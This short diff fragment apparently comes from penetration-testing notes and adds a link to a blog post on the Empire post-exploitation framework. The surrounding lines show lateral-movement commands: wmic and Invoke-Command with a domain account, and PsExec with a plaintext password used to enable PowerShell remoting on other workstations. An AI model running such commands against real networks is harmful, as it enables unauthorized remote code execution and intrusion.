@@ -20,5 +20,6 @@ wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "powershe
    Invoke-Command -Computer ordws01 -ScriptBlock {ipconfig /all} -credential CSCOU\jarrieta 
    
    C:\tools\SysinternalsSuite> .\PsExec.exe \\ordws04 -u cscou\jarrieta -p nastyCutt3r -h -d powershell.exe "enable-psremoting -force"  
+http://www.harmj0y.net/blog/empire/expanding-your-empire/
 
 ```
